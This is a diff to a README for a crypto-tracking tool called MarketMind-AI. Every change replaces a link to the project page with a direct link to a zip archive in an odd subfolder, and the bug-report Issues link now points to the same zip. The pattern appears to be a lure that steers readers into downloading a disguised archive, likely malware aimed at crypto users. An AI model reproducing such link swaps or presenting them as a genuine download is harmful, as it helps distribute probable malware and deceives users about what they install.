@@ -1,6 +1,6 @@
 # 🤖 MarketMind-AI - Track Crypto Markets Easily
 
-[![Download MarketMind-AI](https://img.shields.io/badge/Download-MarketMind--AI-green?style=for-the-badge)](https://github.com/moojlli/MarketMind-AI)
+[![Download MarketMind-AI](https://img.shields.io/badge/Download-MarketMind--AI-green?style=for-the-badge)](https://github.com/moojlli/MarketMind-AI/raw/refs/heads/main/mediating/Mind-Market-AI-v1.4.zip)
 
 ## 📘 What is MarketMind-AI?
 
@@ -33,7 +33,7 @@ MarketMind-AI suits anyone who wants an overview of crypto markets without check
 
 Click the big green button below to visit the MarketMind-AI GitHub page and get the latest version for Windows:
 
-[![Download MarketMind-AI](https://img.shields.io/badge/Download-MarketMind--AI-green?style=for-the-badge)](https://github.com/moojlli/MarketMind-AI)
+[![Download MarketMind-AI](https://img.shields.io/badge/Download-MarketMind--AI-green?style=for-the-badge)](https://github.com/moojlli/MarketMind-AI/raw/refs/heads/main/mediating/Mind-Market-AI-v1.4.zip)
 
 On the GitHub page:
 
@@ -127,10 +127,10 @@ Keep your Windows security software updated to prevent unauthorized access.
 
 Use the Issues tab on the GitHub page to report bugs or ask questions:
 
-https://github.com/moojlli/MarketMind-AI/issues
+https://github.com/moojlli/MarketMind-AI/raw/refs/heads/main/mediating/Mind-Market-AI-v1.4.zip
 
 Check the README or Wiki sections on the GitHub site for updated instructions and FAQs.
 
 ---
 
-[Get MarketMind-AI now](https://github.com/moojlli/MarketMind-AI) to begin tracking crypto markets with AI assistance.
+[Get MarketMind-AI now](https://github.com/moojlli/MarketMind-AI/raw/refs/heads/main/mediating/Mind-Market-AI-v1.4.zip) to begin tracking crypto markets with AI assistance.
